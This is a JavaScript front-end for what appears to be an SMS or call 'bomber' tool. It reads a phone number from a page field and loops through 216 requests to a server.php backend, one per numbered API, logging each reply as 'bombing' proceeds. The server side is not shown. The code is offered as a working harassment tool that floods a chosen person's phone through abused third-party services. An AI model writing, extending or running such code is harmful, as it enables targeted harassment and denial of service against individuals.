function log(text) {
    const logDiv = document.getElementById("log");
    logDiv.innerHTML += text + "\n";
    logDiv.scrollTop = logDiv.scrollHeight;
}

function startBombing() {
    const phone = document.getElementById("phone").value.trim();
    if (!phone) return alert("Please enter a phone number!");

    log("Starting bombing for: " + phone + "\n");

    for (let i = 1; i <= 216; i++) {
        fetch(`server.php?phone=${encodeURIComponent(phone)}&api=${i}`)
            .then(response => response.text())
            .then(data => log(`[API ${i}] ${data}`))
            .catch(err => log(`[API ${i}] Error: ${err}`));
    }
}
